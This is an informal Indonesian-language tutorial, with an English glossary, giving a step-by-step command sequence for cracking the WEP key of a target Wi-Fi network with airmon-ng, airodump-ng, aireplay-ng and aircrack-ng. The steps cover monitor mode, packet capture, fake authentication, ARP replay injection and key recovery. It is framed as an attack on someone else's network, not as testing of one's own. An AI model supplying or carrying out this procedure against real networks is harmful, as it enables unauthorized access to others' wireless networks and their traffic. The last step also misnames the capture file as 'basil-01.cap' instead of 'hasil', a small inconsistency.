Glosari:
wlan0 = Interface (Examples: wlan0, ath0, eth0)
ch = The channel the target is on (Examples: 6, 11)
bssid = MAC Address of target (cth: 11:22:33:B1:44:C2)
ssid = Name of target (Examples: linksys, default)
filename = Name of .cap file (cth: wep123, target, anythingyoutwant)
fragment-*.xor= The * being replaced by a number
(cth: fragment-25313-0123.xor)

PASSWORD DECRYPTED (Examples: PA:SS:WO:RD or 09:87:65:43:21)
Ignore titik duanya (:)

..::WEP CRACK GUIDE::..

1.buka konsol

2.ketik airmon-ng [ENTER]
(disini kalian akan melihat wireless interface milik kalian)

3. ketik airmon-ng stop wlan0 [ENTER] ***kalau interface-nya wlan0.***berikutnya aku g ngetik kata 'ketik' dan 'enter' lagi***

4. Oia..jgn lupa baca bismillah..

5. airmon-ng start wlan0

6. ifconfig wlan0 up

7. iwconfig wlan0 mode monitor

8. airodump-ng wlan0

9. Tekan CTRL+C kalau sudah menemukan target yang mau dicrack, kemudian COPY THE BSSID

10. airodump-ng -c (ch) -w hasil --bssid (bssid) wlan0
***untuk memfilter channel dan bssid yg ingin kita crack,kemudian mencatat hasil dengan nama 'hasil'***

11. Buka Konsole baru tanpa menutup konsol sebelumnya dan ketik perintah berikut:
12. aireplay-ng -1 0 -a (bssid) -h (mac address kalian) wlan0
13. aireplay-ng -3 -b (bssid) -h (mac address kalian) wlan0
**tunggu sampe packet yg ditangkap airodump tadi cukup,pengalamanku sh 10rb paket cukup**
14. Buka Konsole baru dan ketik perintah berikut:
15. aircrack-ng -b (bssid) basil-01.cap
**tunggu hingga proses cracking slesai.
